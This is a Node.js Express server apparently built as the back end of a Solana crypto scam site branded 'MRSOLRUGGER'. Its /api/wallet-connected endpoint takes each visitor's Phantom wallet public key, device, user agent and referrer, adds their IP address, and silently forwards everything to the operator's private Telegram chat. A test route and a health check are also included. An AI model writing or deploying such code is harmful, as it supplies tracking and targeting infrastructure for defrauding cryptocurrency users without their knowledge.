const express = require('express');
const cors = require('cors');
const axios = require('axios');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public')); // Serve your HTML files from public folder

// Serve the main HTML file at root
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Validate environment variables
if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Missing required environment variables:');
    console.error('   TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID must be set');
    process.exit(1);
}

// Function to send message to Telegram
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        
        console.log('✅ Telegram message sent successfully');
        return response.data;
    } catch (error) {
        console.error('❌ Failed to send Telegram message:', error.response?.data || error.message);
        throw error;
    }
}

// Function to format wallet connection message
function formatWalletMessage(walletData) {
    const timestamp = new Date().toLocaleString('en-US', {
        timeZone: 'UTC',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });

    return `
🔗 <b>New Wallet Connection - MRSOLRUGGER</b>

📅 <b>Time:</b> ${timestamp} UTC
👛 <b>Wallet:</b> <code>${walletData.publicKey}</code>
🌐 <b>Connection Type:</b> ${walletData.connectionType}
📱 <b>Device:</b> ${walletData.device}
🔗 <b>User Agent:</b> ${walletData.userAgent || 'Not provided'}
🌍 <b>IP:</b> ${walletData.ipAddress || 'Unknown'}
${walletData.referrer ? `🔗 <b>Referrer:</b> ${walletData.referrer}` : ''}

#WalletConnection #Phantom #Solana
    `.trim();
}

// API endpoint to handle wallet connections
app.post('/api/wallet-connected', async (req, res) => {
    try {
        const { publicKey, connectionType, device, userAgent, referrer } = req.body;
        
        // Validate required data
        if (!publicKey) {
            return res.status(400).json({ 
                success: false, 
                error: 'Public key is required' 
            });
        }

        // Get client IP
        const ipAddress = req.headers['x-forwarded-for'] || 
                         req.connection.remoteAddress || 
                         req.socket.remoteAddress ||
                         (req.connection.socket ? req.connection.socket.remoteAddress : null);

        // Prepare wallet data
        const walletData = {
            publicKey: publicKey,
            connectionType: connectionType || 'unknown',
            device: device || 'unknown',
            userAgent: userAgent,
            referrer: referrer,
            ipAddress: ipAddress
        };

        // Format and send Telegram message
        const message = formatWalletMessage(walletData);
        await sendTelegramMessage(message);

        // Log the connection
        console.log(`📊 New wallet connection: ${publicKey.slice(0, 6)}...${publicKey.slice(-4)}`);

        // Respond to client
        res.json({ 
            success: true, 
            message: 'Wallet connection logged successfully',
            timestamp: new Date().toISOString()
        });

    } catch (error) {
        console.error('Error handling wallet connection:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to process wallet connection' 
        });
    }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        timestamp: new Date().toISOString(),
        service: 'MRSOLRUGGER Wallet Backend'
    });
});

// Test Telegram connection endpoint
app.post('/api/test-telegram', async (req, res) => {
    try {
        const testMessage = `🧪 <b>Test Message</b>\n\nTelegram bot connection is working!\n\nTime: ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })} UTC`;
        
        await sendTelegramMessage(testMessage);
        
        res.json({ 
            success: true, 
            message: 'Test message sent to Telegram successfully' 
        });
    } catch (error) {
        res.status(500).json({ 
            success: false, 
            error: 'Failed to send test message to Telegram',
            details: error.message
        });
    }
});

// Error handling middleware
app.use((error, req, res, next) => {
    console.error('Unhandled error:', error);
    res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
    });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({ 
        success: false, 
        error: 'Endpoint not found' 
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 MRSOLRUGGER Backend server running on port ${PORT}`);
    console.log(`📊 Health check: http://localhost:${PORT}/api/health`);
    console.log(`🧪 Test Telegram: POST http://localhost:${PORT}/api/test-telegram`);
    console.log(`💰 Wallet endpoint: POST http://localhost:${PORT}/api/wallet-connected`);
});

module.exports = app;
